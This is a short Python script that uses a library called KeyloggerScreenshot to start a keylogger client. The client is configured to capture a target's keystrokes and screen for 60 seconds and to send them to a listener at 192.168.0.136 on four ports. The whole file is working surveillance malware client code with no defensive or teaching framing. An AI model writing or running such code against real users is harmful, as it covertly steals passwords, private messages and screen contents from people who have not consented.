import KeyloggerScreenshot as ks 

ip = '192.168.0.136'
key_client = ks.KeyloggerTarget(ip, 7819, ip, 8145, ip, 1728, ip, 4187, duration_in_seconds=60) 
key_client.start()
